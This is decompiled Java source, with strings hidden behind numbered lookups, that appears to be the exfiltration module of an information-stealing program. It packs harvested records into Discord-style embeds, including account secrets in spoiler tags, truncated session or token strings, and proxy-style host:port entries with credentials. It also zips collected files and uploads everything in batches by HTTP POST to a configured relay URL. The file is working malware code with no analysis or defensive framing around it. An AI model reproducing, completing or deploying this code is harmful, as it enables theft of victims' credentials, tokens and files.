/*
 * Decompiled with CFR 0.152.
 */
package x;

import aether.Config;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import x.aa;
import x.ab;
import x.ac;
import x.ae;
import x.af;
import x.ag;
import x.ah;
import x.ai;
import x.d;
import x.n;
import x.o;
import x.r;
import x.s;
import x.t;
import x.u;
import x.v;
import x.w;
import x.x;
import x.y;
import x.z;

public final class h {
    private static final OkHttpClient a = new OkHttpClient.Builder().connectTimeout(15L, TimeUnit.SECONDS).writeTimeout(60L, TimeUnit.SECONDS).readTimeout(30L, TimeUnit.SECONDS).build();

    /*
     * WARNING - void declaration
     */
    public static void a(Config object, b object22, boolean bl) throws Exception {
        void var10_99;
        Object object2;
        Object object3;
        Object object4;
        Object object5;
        Iterator<Object> n7 = ((b)object22).D.isEmpty() ? $S.d(270) : String.join((CharSequence)", ", ((b)object22).D);
        String string = ((b)object22).E.isEmpty() ? $S.d(270) : String.join((CharSequence)", ", ((b)object22).E);
        int n2 = ((b)object22).F.size();
        Object object6 = String.format($S.d(885), ((b)object22).a, ((b)object22).c, ((b)object22).f, ((b)object22).g, ((b)object22).h, ((b)object22).i, ((b)object22).l, ((b)object22).m, n2, ((b)object22).n, ((b)object22).s, ((b)object22).o, ((b)object22).p, ((b)object22).q, ((b)object22).r, ((b)object22).t ? 1 : 0, ((b)object22).u ? 1 : 0, ((b)object22).v ? 1 : 0, ((b)object22).w ? 1 : 0, ((b)object22).x ? 1 : 0, ((b)object22).y ? 1 : 0, ((b)object22).z ? 1 : 0, ((b)object22).A ? 1 : 0, ((b)object22).B ? 1 : 0, ((b)object22).C != null && !((b)object22).C.isEmpty() ? 1 : 0, ((b)object22).j, ((b)object22).k, ((b)object22).Y);
        JsonArray jsonArray = new JsonArray();
        Object object7 = new JsonObject();
        ((JsonObject)object7).add($S.d(886), h.a($S.d(887), $S.d(888)));
        ((JsonObject)object7).add($S.d(889), h.a($S.d(888)));
        ((JsonObject)object7).addProperty($S.d(890), (String)object6);
        ((JsonObject)object7).add($S.d(891), h.b($S.d(892)));
        ((JsonObject)object7).addProperty($S.d(893), 0xE8E8E8);
        jsonArray.add((JsonElement)object7);
        object6 = new JsonObject();
        ((JsonObject)object6).add($S.d(886), h.a($S.d(894), $S.d(888)));
        object7 = new JsonArray();
        ((JsonArray)object7).add(h.a($S.d(895), "`" + (String)((Object)n7) + "`", false));
        ((JsonArray)object7).add(h.a($S.d(896), "`" + string + "`", false));
        ((JsonArray)object7).add(h.a($S.d(897), "`" + ((b)object22).c + "`", true));
        ((JsonArray)object7).add(h.a($S.d(898), "`" + ((b)object22).m + $S.d(899), true));
        ((JsonObject)object6).add($S.d(900), (JsonElement)object7);
        ((JsonObject)object6).add($S.d(891), h.b($S.d(892)));
        ((JsonObject)object6).addProperty($S.d(893), 0xE8E8E8);
        jsonArray.add((JsonElement)object6);
        for (n.a a2 : ((b)object22).F) {
            if (a2.l) continue;
            object6 = a2.i != null && !a2.i.isEmpty() ? a2.i : $S.d(888);
            object7 = new JsonObject();
            ((JsonObject)object7).add($S.d(886), h.a(a2.c + " (" + a2.b + ")", (String)object6));
            ((JsonObject)object7).add($S.d(889), h.a((String)object6));
            object5 = new JsonArray();
            ((JsonArray)object5).add(h.a($S.d(901), "||" + a2.a + "||", false));
            ((JsonArray)object5).add(h.a($S.d(902), a2.h != null ? a2.h : $S.d(270), false));
            ((JsonArray)object5).add(h.a($S.d(903), "`" + (a2.f != null ? a2.f : $S.d(270)) + "`", true));
            ((JsonArray)object5).add(h.a($S.d(904), "`" + (a2.g != null ? a2.g : "No") + "`", true));
            ((JsonArray)object5).add(h.a($S.d(905), "`" + (a2.d != null ? a2.d : $S.d(906)) + "`", true));
            ((JsonArray)object5).add(h.a($S.d(907), "`" + (a2.e != null && !a2.e.isEmpty() ? a2.e : $S.d(270)) + "`", true));
            ((JsonArray)object5).add(h.a($S.d(897), "`" + ((b)object22).c + "`", true));
            ((JsonObject)object7).add($S.d(900), (JsonElement)object5);
            ((JsonObject)object7).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object7).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object7);
            object4 = a2.j != null && !a2.j.isEmpty() ? String.join((CharSequence)"\n", a2.j) : $S.d(908);
            object3 = new JsonObject();
            ((JsonObject)object3).add($S.d(886), h.a($S.d(909) + (a2.j != null ? a2.j.size() : 0) + ")", (String)object6));
            ((JsonObject)object3).addProperty($S.d(890), (String)object4);
            ((JsonObject)object3).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object3).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object3);
            String string2 = a2.k != null && !a2.k.isEmpty() ? String.join((CharSequence)"\n", a2.k) : $S.d(908);
            object2 = new JsonObject();
            ((JsonObject)object2).add($S.d(886), h.a($S.d(910) + (a2.k != null ? a2.k.size() : 0) + ")", (String)object6));
            ((JsonObject)object2).addProperty($S.d(890), string2);
            ((JsonObject)object2).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object2).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object2);
        }
        for (ac.a a3 : ((b)object22).G) {
            object6 = a3.e != null && !a3.e.isEmpty() ? a3.e : $S.d(888);
            object7 = a3.c != null && !a3.c.isEmpty() ? a3.c : a3.a;
            object5 = new JsonObject();
            ((JsonObject)object5).add($S.d(886), h.a($S.d(911) + (String)object7 + " (" + a3.a + ")", (String)object6));
            ((JsonObject)object5).add($S.d(889), h.a((String)object6));
            object4 = new JsonArray();
            ((JsonArray)object4).add(h.a($S.d(912), "`" + (a3.c != null ? a3.c : "-") + "`", true));
            ((JsonArray)object4).add(h.a($S.d(913), "`" + (a3.b != null ? a3.b : $S.d(906)) + "`", true));
            ((JsonArray)object4).add(h.a($S.d(914), "`" + a3.f + "`", true));
            ((JsonArray)object4).add(h.a($S.d(915), "`" + (a3.g ? $S.d(356) : "No") + "`", true));
            ((JsonArray)object4).add(h.a($S.d(916), $S.d(917) + (a3.d != null ? a3.d : "") + ")", true));
            ((JsonObject)object5).add($S.d(900), (JsonElement)object4);
            ((JsonObject)object5).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object5).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object5);
        }
        for (z.a a4 : ((b)object22).H) {
            object6 = a4.g != null && !a4.g.isEmpty() ? a4.g : $S.d(888);
            object7 = new JsonObject();
            ((JsonObject)object7).add($S.d(886), h.a($S.d(918) + a4.a + " (" + a4.c + ")", (String)object6));
            ((JsonObject)object7).add($S.d(889), h.a((String)object6));
            object5 = new JsonArray();
            ((JsonArray)object5).add(h.a($S.d(919), "`" + a4.a + "`", true));
            ((JsonArray)object5).add(h.a($S.d(920), "`" + (a4.b != null ? a4.b : "-") + "`", true));
            ((JsonArray)object5).add(h.a($S.d(921), "`" + a4.d + "`", true));
            ((JsonArray)object5).add(h.a($S.d(922), "`" + (a4.e ? $S.d(356) : "No") + "`", true));
            ((JsonArray)object5).add(h.a($S.d(916), $S.d(923) + a4.c + $S.d(924), true));
            ((JsonObject)object7).add($S.d(900), (JsonElement)object5);
            ((JsonObject)object7).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object7).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object7);
        }
        if (((b)object22).N != null && ((b)object22).N.a) {
            int n8 = ((b)object22).N.b != null ? ((b)object22).N.b.size() : 0;
            String string3 = n8 > 0 ? String.join((CharSequence)", ", ((b)object22).N.b) : $S.d(925);
            boolean bl2 = ((b)object22).N.c != null && !((b)object22).N.c.isEmpty();
            boolean bl3 = false;
            object5 = null;
            object4 = null;
            if (((b)object22).N.d != null) {
                for (Map map : ((b)object22).N.d) {
                    if ($S.d(556).equals(map.get($S.d(549))) && map.get($S.d(926)) != null) {
                        bl3 = true;
                        object4 = (String)map.get($S.d(926));
                    }
                    if (!$S.d(550).equals(map.get($S.d(549))) || map.get($S.d(322)) == null || object5 != null) continue;
                    object5 = (String)map.get($S.d(322));
                }
            }
            object3 = new JsonObject();
            ((JsonObject)object3).add($S.d(886), h.a($S.d(927) + n8 + $S.d(928), $S.d(888)));
            JsonArray jsonArray2 = new JsonArray();
            jsonArray2.add(h.a($S.d(929), "`" + string3 + "`", false));
            jsonArray2.add(h.a($S.d(930), "`" + (bl2 ? $S.d(356) : "No") + "`", true));
            jsonArray2.add(h.a($S.d(931), "`" + (bl3 ? $S.d(932) : $S.d(933)) + "`", true));
            if (object5 != null) {
                jsonArray2.add(h.a($S.d(913), "`" + (String)object5 + "`", true));
            }
            if (bl3 && object4 != null) {
                object2 = ((String)object4).length() > 80 ? ((String)object4).substring(0, 80) + $S.d(934) : object4;
                jsonArray2.add(h.a($S.d(935), "||" + object2 + "||", false));
            }
            ((JsonObject)object3).add($S.d(900), jsonArray2);
            ((JsonObject)object3).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object3).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object3);
        }
        if (((b)object22).O != null && ((b)object22).O.a) {
            JsonObject string4 = new JsonObject();
            string4.add($S.d(886), h.a($S.d(936) + ((b)object22).O.b, $S.d(888)));
            JsonArray jsonArray3 = new JsonArray();
            jsonArray3.add(h.a($S.d(919), "`" + ((b)object22).O.b + "`", true));
            jsonArray3.add(h.a($S.d(937), "||" + (((b)object22).O.c != null ? ((b)object22).O.c : $S.d(906)) + "||", true));
            string4.add($S.d(900), jsonArray3);
            string4.add($S.d(891), h.b($S.d(892)));
            string4.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(string4);
        }
        if (((b)object22).P != null && ((b)object22).P.a) {
            int string5 = ((b)object22).P.b != null ? ((b)object22).P.b.size() : 0;
            StringBuilder stringBuilder = new StringBuilder();
            if (((b)object22).P.b != null) {
                for (String string6 : ((b)object22).P.b) {
                    stringBuilder.append("`").append(string6).append("`\n");
                }
            }
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(938) + string5 + $S.d(939), $S.d(888)));
            JsonArray jsonArray4 = new JsonArray();
            jsonArray4.add(h.a($S.d(940), "`" + (((b)object22).P.c != null ? ((b)object22).P.c : $S.d(906)) + "`", false));
            jsonArray4.add(h.a($S.d(941), stringBuilder.length() > 0 ? stringBuilder.toString().trim() : $S.d(942), false));
            jsonObject.add($S.d(900), jsonArray4);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        if (((b)object22).Q != null && ((b)object22).Q.a && ((b)object22).Q.b != null) {
            int string7 = ((b)object22).Q.b.size();
            StringBuilder stringBuilder = new StringBuilder();
            int n3 = Math.min(string7, 8);
            for (int i2 = 0; i2 < n3; ++i2) {
                object5 = ((b)object22).Q.b.get(i2);
                stringBuilder.append("`").append(((t.b)object5).a).append(":").append(((t.b)object5).b).append("`");
                if (((t.b)object5).c != null && !((t.b)object5).c.isEmpty()) {
                    stringBuilder.append($S.d(943)).append(((t.b)object5).c).append($S.d(944)).append(((t.b)object5).d != null ? ((t.b)object5).d : $S.d(906)).append("||");
                } else {
                    stringBuilder.append($S.d(945));
                }
                stringBuilder.append("\n");
            }
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(946) + string7 + $S.d(947), $S.d(888)));
            jsonObject.addProperty($S.d(890), stringBuilder.length() > 0 ? stringBuilder.toString().trim() : $S.d(948));
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        if (((b)object22).R != null && ((b)object22).R.a) {
            int arrayList = ((b)object22).R.b != null ? ((b)object22).R.b.size() : 0;
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(949), $S.d(888)));
            JsonArray jsonArray5 = new JsonArray();
            jsonArray5.add(h.a($S.d(950), "`" + arrayList + "`", true));
            jsonArray5.add(h.a($S.d(951), $S.d(952), false));
            jsonObject.add($S.d(900), jsonArray5);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        if (((b)object22).S != null && ((b)object22).S.a) {
            int n4 = ((b)object22).S.b != null ? ((b)object22).S.b.size() : 0;
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(953), $S.d(888)));
            JsonArray jsonArray6 = new JsonArray();
            jsonArray6.add(h.a($S.d(950), "`" + n4 + "`", true));
            jsonArray6.add(h.a($S.d(951), $S.d(954), false));
            jsonObject.add($S.d(900), jsonArray6);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        if (((b)object22).T != null && ((b)object22).T.a) {
            String string8 = ((b)object22).T.b;
            String string9 = string8 != null && !string8.isEmpty() ? "||" + (string8.length() > 80 ? string8.substring(0, 80) : string8) + "||" : $S.d(942);
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(955), $S.d(888)));
            JsonArray jsonArray7 = new JsonArray();
            jsonArray7.add(h.a($S.d(905), "`" + (((b)object22).T.c != null ? ((b)object22).T.c : $S.d(906)) + "`", true));
            jsonArray7.add(h.a($S.d(901), string9, false));
            jsonObject.add($S.d(900), jsonArray7);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        if (((b)object22).U != null && ((b)object22).U.a) {
            String string10 = ((b)object22).U.b;
            String string11 = string10 != null && !string10.isEmpty() ? "||" + (string10.length() > 80 ? string10.substring(0, 80) : string10) + "||" : $S.d(942);
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(956), $S.d(888)));
            JsonArray jsonArray8 = new JsonArray();
            jsonArray8.add(h.a($S.d(905), "`" + (((b)object22).U.c != null ? ((b)object22).U.c : $S.d(906)) + "`", true));
            jsonArray8.add(h.a($S.d(901), string11, false));
            jsonObject.add($S.d(900), jsonArray8);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        if (((b)object22).V != null && ((b)object22).V.a) {
            String string12 = ((b)object22).V.c;
            String string13 = string12 != null && !string12.isEmpty() ? "||" + (string12.length() > 80 ? string12.substring(0, 80) : string12) + "||" : $S.d(942);
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(957), $S.d(888)));
            JsonArray jsonArray9 = new JsonArray();
            jsonArray9.add(h.a($S.d(905), "`" + (((b)object22).V.b != null ? ((b)object22).V.b : $S.d(906)) + "`", true));
            jsonArray9.add(h.a($S.d(901), string13, false));
            jsonObject.add($S.d(900), jsonArray9);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        for (v.a a5 : ((b)object22).I) {
            String string14 = a5.i.length() > 60 ? a5.i.substring(0, 60) + $S.d(934) : a5.i;
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(958) + a5.a, $S.d(888)));
            jsonObject.add($S.d(889), h.a($S.d(888)));
            object5 = new JsonArray();
            ((JsonArray)object5).add(h.a($S.d(919), "`@" + a5.a + "`", true));
            ((JsonArray)object5).add(h.a($S.d(959), "`" + (a5.b != null ? a5.b : "-") + "`", true));
            ((JsonArray)object5).add(h.a($S.d(960), "`" + a5.c + "`", true));
            ((JsonArray)object5).add(h.a($S.d(961), "`" + a5.d + "`", true));
            ((JsonArray)object5).add(h.a($S.d(962), "`" + a5.e + "`", true));
            ((JsonArray)object5).add(h.a($S.d(963), "`" + (a5.f ? $S.d(356) : "No") + "`", true));
            ((JsonArray)object5).add(h.a($S.d(935), "||" + string14 + "||", false));
            jsonObject.add($S.d(900), (JsonElement)object5);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        for (af.a a6 : ((b)object22).J) {
            String string15 = a6.f != null ? a6.f : $S.d(906);
            String string16 = string15.length() > 60 ? string15.substring(0, 60) + $S.d(934) : string15;
            object5 = new JsonObject();
            ((JsonObject)object5).add($S.d(886), h.a($S.d(964) + a6.a, $S.d(888)));
            ((JsonObject)object5).add($S.d(889), h.a($S.d(888)));
            object4 = new JsonArray();
            ((JsonArray)object4).add(h.a($S.d(919), "`@" + a6.a + "`", true));
            ((JsonArray)object4).add(h.a($S.d(965), "`" + (a6.b != null ? a6.b : "-") + "`", true));
            ((JsonArray)object4).add(h.a($S.d(905), "`" + (a6.c != null && !a6.c.isEmpty() ? a6.c : $S.d(270)) + "`", true));
            ((JsonArray)object4).add(h.a($S.d(960), "`" + a6.d + "`", true));
            ((JsonArray)object4).add(h.a($S.d(966), "`" + a6.e + "`", true));
            ((JsonArray)object4).add(h.a($S.d(935), "||" + string16 + "||", false));
            ((JsonObject)object5).add($S.d(900), (JsonElement)object4);
            ((JsonObject)object5).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object5).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object5);
        }
        for (ab.a a7 : ((b)object22).K) {
            String string17 = a7.g != null ? a7.g : "";
            String string18 = string17.length() > 60 ? string17.substring(0, 60) + $S.d(934) : string17;
            object5 = new JsonObject();
            ((JsonObject)object5).add($S.d(886), h.a($S.d(967) + a7.a, $S.d(888)));
            ((JsonObject)object5).add($S.d(889), h.a($S.d(888)));
            object4 = new JsonArray();
            ((JsonArray)object4).add(h.a($S.d(919), "`" + a7.a + "`", true));
            ((JsonArray)object4).add(h.a($S.d(905), "`" + (a7.c != null ? a7.c : $S.d(270)) + "`", true));
            ((JsonArray)object4).add(h.a($S.d(968), "`" + (a7.e != null ? a7.e : "-") + "`", true));
            ((JsonArray)object4).add(h.a($S.d(960), "`" + a7.f + "`", true));
            ((JsonArray)object4).add(h.a($S.d(969), "`" + (a7.d != null ? a7.d : "-") + "`", true));
            ((JsonArray)object4).add(h.a($S.d(970), "||" + string18 + "||", false));
            ((JsonObject)object5).add($S.d(900), (JsonElement)object4);
            ((JsonObject)object5).add($S.d(891), h.b($S.d(892)));
            ((JsonObject)object5).addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add((JsonElement)object5);
        }
        for (x.a a8 : ((b)object22).L) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(971) + a8.a, $S.d(888)));
            jsonObject.add($S.d(889), h.a($S.d(888)));
            JsonArray jsonArray10 = new JsonArray();
            jsonArray10.add(h.a($S.d(919), $S.d(972) + a8.a + "`", true));
            jsonArray10.add(h.a($S.d(973), "`" + a8.b + "`", true));
            jsonArray10.add(h.a($S.d(974), "`" + (a8.c ? $S.d(356) : "No") + "`", true));
            jsonArray10.add(h.a($S.d(975), "`" + (a8.d ? $S.d(356) : "No") + "`", true));
            jsonArray10.add(h.a($S.d(976), "`" + a8.e + "`", true));
            jsonObject.add($S.d(900), jsonArray10);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        for (w.a a9 : ((b)object22).M) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.add($S.d(886), h.a($S.d(977) + a9.b, $S.d(888)));
            JsonArray jsonArray11 = new JsonArray();
            jsonArray11.add(h.a($S.d(978), "`" + (a9.a != null ? a9.a : "-") + "`", true));
            jsonArray11.add(h.a($S.d(979), "`" + (a9.d != null ? a9.d : "-") + "`", true));
            jsonArray11.add(h.a($S.d(980), "`" + (a9.f ? $S.d(356) : "No") + "`", true));
            jsonArray11.add(h.a($S.d(981), "`" + (a9.c != null ? a9.c : $S.d(906)) + "`", false));
            if (a9.e != null && !a9.e.isEmpty()) {
                jsonArray11.add(h.a($S.d(982), "||" + a9.e + "||", false));
            }
            jsonObject.add($S.d(900), jsonArray11);
            jsonObject.add($S.d(891), h.b($S.d(892)));
            jsonObject.addProperty($S.d(893), 0xE8E8E8);
            jsonArray.add(jsonObject);
        }
        ArrayList<a> arrayList = new ArrayList<a>(((b)object22).Z);
        if (((b)object22).e != null) {
            arrayList.add(new a($S.d(983), ((b)object22).e));
        }
        if (((b)object22).d != null) {
            arrayList.add(new a($S.d(984), ((b)object22).d.getBytes($S.d(399))));
        }
        byte[] byArray = h.a((List<a>)arrayList);
        String string19 = String.format($S.d(985), new Random().nextInt());
        String string20 = $S.d(986) + string19 + $S.d(987);
        object5 = d.a();
        object4 = h.a(jsonArray, 10);
        object3 = ((Config)object).relayUrl;
        boolean bl4 = false;
        while (var10_99 < object4.size()) {
            object2 = new JsonArray();
            for (JsonElement jsonElement : object4.get((int)var10_99)) {
                ((JsonArray)object2).add(jsonElement);
            }
            object = new JsonObject();
            ((JsonObject)object).addProperty($S.d(322), $S.d(887));
            ((JsonObject)object).add($S.d(988), (JsonElement)object2);
            String string21 = new Gson().toJson((JsonElement)object);
            byte[] byArray2 = h.a(string21, (byte[])(var10_99 == false ? byArray : null), var10_99 == false ? string20 : null, (String)object5);
            object = byArray2;
            object = RequestBody.create(byArray2, MediaType.parse($S.d(989)));
            object = new Request.Builder().url((String)object3).post((RequestBody)object).build();
            object = a.newCall((Request)object).execute();
            try {
                if (!((Response)object).isSuccessful()) {
                    String string22 = ((Response)object).body() != null ? ((Response)object).body().string() : "";
                    throw new Exception($S.d(990) + ((Response)object).code() + ": " + string22);
                }
            }
            finally {
                if (object != null) {
                    ((Response)object).close();
                }
            }
            if (var10_99 < object4.size() - 1) {
                Thread.sleep(500L);
            }
            ++var10_99;
        }
    }

    private static JsonObject a(String string, String string2) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty($S.d(9), string);
        jsonObject.addProperty($S.d(991), string2);
        return jsonObject;
    }

    private static JsonObject a(String string) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty($S.d(94), string);
        return jsonObject;
    }

    private static JsonObject b(String string) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty($S.d(425), string);
        return jsonObject;
    }

    private static JsonObject a(String string, String string2, boolean bl) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty($S.d(9), string);
        jsonObject.addProperty($S.d(10), string2 != null && !string2.isEmpty() ? string2 : "\u200b");
        jsonObject.addProperty($S.d(992), bl);
        return jsonObject;
    }

    private static List<List<JsonElement>> a(JsonArray object, int n2) {
        ArrayList<List<JsonElement>> arrayList = new ArrayList<List<JsonElement>>();
        ArrayList<JsonElement> arrayList2 = new ArrayList<JsonElement>();
        object = ((JsonArray)object).iterator();
        while (object.hasNext()) {
            JsonElement jsonElement = (JsonElement)object.next();
            arrayList2.add(jsonElement);
            if (arrayList2.size() != 10) continue;
            arrayList.add(arrayList2);
            arrayList2 = new ArrayList();
        }
        if (!arrayList2.isEmpty()) {
            arrayList.add(arrayList2);
        }
        if (arrayList.isEmpty()) {
            arrayList.add(new ArrayList());
        }
        return arrayList;
    }

    private static byte[] a(String string, byte[] byArray, String string2, String string3) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        h.a(byteArrayOutputStream, $S.d(993));
        h.a(byteArrayOutputStream, $S.d(994));
        h.a(byteArrayOutputStream, $S.d(995));
        h.a(byteArrayOutputStream, "\r\n");
        h.a(byteArrayOutputStream, string);
        h.a(byteArrayOutputStream, "\r\n");
        if (string3 != null && !string3.isEmpty()) {
            h.a(byteArrayOutputStream, $S.d(993));
            h.a(byteArrayOutputStream, $S.d(996));
            h.a(byteArrayOutputStream, "\r\n");
            h.a(byteArrayOutputStream, string3);
            h.a(byteArrayOutputStream, "\r\n");
        }
        if (byArray != null && string2 != null) {
            h.a(byteArrayOutputStream, $S.d(993));
            h.a(byteArrayOutputStream, $S.d(997) + string2 + $S.d(998));
            h.a(byteArrayOutputStream, $S.d(999));
            h.a(byteArrayOutputStream, "\r\n");
            byteArrayOutputStream.write(byArray);
            h.a(byteArrayOutputStream, "\r\n");
        }
        h.a(byteArrayOutputStream, $S.d(1000));
        return byteArrayOutputStream.toByteArray();
    }

    private static void a(ByteArrayOutputStream byteArrayOutputStream, String string) throws Exception {
        byteArrayOutputStream.write(string.getBytes($S.d(399)));
    }

    private static byte[] a(List<a> object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try (ZipOutputStream zipOutputStream = new ZipOutputStream(byteArrayOutputStream);){
            object = object.iterator();
            while (object.hasNext()) {
                a a2 = (a)object.next();
                if (a2.b == null) continue;
                zipOutputStream.putNextEntry(new ZipEntry(a2.a));
                zipOutputStream.write(a2.b);
                zipOutputStream.closeEntry();
            }
        }
        return byteArrayOutputStream.toByteArray();
    }

    public static final class b {
        public String a = $S.d(884);
        public String b = $S.d(884);
        public String c = $S.d(884);
        public String d;
        public byte[] e;
        public int f;
        public int g;
        public int h;
        public int i;
        public int j;
        public int k;
        public int l;
        public int m;
        public int n;
        public int o;
        public int p;
        public int q;
        public int r;
        public int s;
        public boolean t;
        public boolean u;
        public boolean v;
        public boolean w;
        public boolean x;
        public boolean y;
        public boolean z;
        public boolean A;
        public boolean B;
        public String C;
        public List<String> D = new ArrayList<String>();
        public List<String> E = new ArrayList<String>();
        public List<n.a> F = new ArrayList<n.a>();
        public List<ac.a> G = new ArrayList<ac.a>();
        public List<z.a> H = new ArrayList<z.a>();
        public List<v.a> I = new ArrayList<v.a>();
        public List<af.a> J = new ArrayList<af.a>();
        public List<ab.a> K = new ArrayList<ab.a>();
        public List<x.a> L = new ArrayList<x.a>();
        public List<w.a> M = new ArrayList<w.a>();
        public y.a N = null;
        public u.a O = null;
        public o.a P = null;
        public t.a Q = null;
        public ae.b R = null;
        public ai.b S = null;
        public ag.a T = null;
        public r.a U = null;
        public aa.a V = null;
        public s.a W = null;
        public List<ah.b> X = new ArrayList<ah.b>();
        public int Y;
        public List<a> Z = new ArrayList<a>();
    }

    public static final class a {
        public String a;
        public byte[] b;

        public a(String string, byte[] byArray) {
            this.a = string;
            this.b = byArray;
        }
    }
}

